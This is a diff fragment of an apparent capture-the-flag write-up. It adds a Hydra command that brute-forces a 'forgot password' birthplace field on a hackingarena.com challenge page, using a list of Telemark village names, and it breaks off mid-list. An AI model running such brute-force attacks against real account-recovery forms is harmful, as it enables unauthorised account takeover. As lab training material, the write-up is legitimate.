@@ -29,3 +29,10 @@ From Kali I used **BurpSuite** to intrude and attack the text field with the lis
 
 Alternative solution after collecting all villages of Telemark, is to use Hydra to attack the website and page "forgot password"
 
+```
+hydra -L Desktop/villages -p '' sidious.hackingarena.com -s 803 http-post-form "/forgot/reminder.php:birthplace=^USER^:incorrect answer"
+```
+
+* -L villages.txt: Specifies file of villages
+* -p '': Specifies an the empty field for villages
+* 
